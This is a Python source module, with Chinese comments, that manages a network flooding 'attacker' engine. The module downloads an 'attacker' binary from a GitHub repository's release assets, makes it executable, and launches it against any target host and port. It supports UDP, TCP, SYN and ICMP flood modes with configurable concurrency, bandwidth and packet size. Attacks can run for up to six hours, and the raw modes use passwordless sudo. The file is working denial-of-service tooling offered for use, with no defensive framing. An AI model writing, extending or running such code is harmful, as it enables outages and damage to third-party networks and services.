# -*- coding: utf-8 -*-
"""
攻击功能（Go attacker 引擎管理）

- 从主仓库 Releases 下载 attacker 二进制
- 启动/停止/状态查询
"""
import os
import json
import time
import signal
import threading
import subprocess

import config
import log
from core import ghapi

logger = log.setup_logger("attack")

attack_state = {
    "running": False, "pid": None, "proc": None,
    "stats": {}, "started_at": None, "mode": "",
}


def _attacker_path():
    return os.path.join(config.FILES_DIR, "attacker")


def ensure_attacker(force=False):
    path = _attacker_path()
    if not force and os.path.exists(path) and os.path.getsize(path) > 100000:
        return path
    logger.info("[attack] 下载 attacker...")
    try:
        url = f"{ghapi.API_BASE}/repos/{config.MAIN_REPO}/releases/tags/attacker"
        status, d = ghapi.gh_request("GET", url, timeout=60)
        if status != 200:
            return None
        for a in d.get("assets", []):
            if a.get("name") == "attacker":
                status, blob = ghapi.gh_request(
                    "GET",
                    f"{ghapi.API_BASE}/repos/{config.MAIN_REPO}/releases/assets/{a['id']}",
                    raw=True, headers={"Accept": "application/octet-stream"}, timeout=180)
                if status == 200:
                    with open(path, "wb") as f:
                        f.write(blob)
                    os.chmod(path, 0o755)
                    logger.info(f"[attack] 下载完成: {len(blob)} 字节")
                    return path
    except Exception as e:
        logger.error(f"[attack] 下载失败: {e}")
    return None


def start_attack(target, mode="udp", port=80, duration=60, concurrency=100,
                 bandwidth=0, packet_size=1024):
    if attack_state["running"]:
        return False, "已有攻击在运行"
    if not target:
        return False, "target 必填"
    path = ensure_attacker()
    if not path:
        return False, "attacker 不可用"
    duration = max(1, min(int(duration), 21600))
    cmd = [path, "-target", target, "-port", str(port), "-mode", mode,
           "-duration", str(duration), "-concurrency", str(concurrency),
           "-bandwidth", str(bandwidth), "-packet", str(packet_size)]
    if mode in ("tcp", "syn", "icmp"):
        cmd = ["sudo", "-n"] + cmd
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, start_new_session=True)
    except Exception as e:
        return False, f"启动失败: {e}"
    attack_state.update({
        "running": True, "pid": proc.pid, "proc": proc,
        "stats": {}, "started_at": time.time(), "mode": mode,
    })
    threading.Thread(target=_reader, args=(proc,), daemon=True).start()
    return True, f"攻击已启动 (pid={proc.pid}, mode={mode})"


def _reader(proc):
    try:
        for line in proc.stdout:
            line = line.strip()
            if line.startswith("{"):
                try:
                    attack_state["stats"] = json.loads(line)
                except Exception as e:
                    logger.debug(f"[attack] reader异常: {e}")
    except Exception as e:
        logger.debug(f"[attack] 操作失败: {e}")
    finally:
        attack_state["running"] = False
        attack_state["proc"] = None


def stop_attack():
    if attack_state["proc"]:
        try:
            os.killpg(os.getpgid(attack_state["proc"].pid), signal.SIGTERM)
            time.sleep(1)
            os.killpg(os.getpgid(attack_state["proc"].pid), signal.SIGKILL)
        except Exception as e:
            logger.debug(f"[attack] 操作失败: {e}")
    attack_state.update({"running": False, "proc": None, "pid": None})
    return True, "攻击已停止"


def attack_status():
    return {
        "running": attack_state["running"],
        "stats": attack_state["stats"],
        "mode": attack_state["mode"],
        "started_at": attack_state["started_at"],
    }
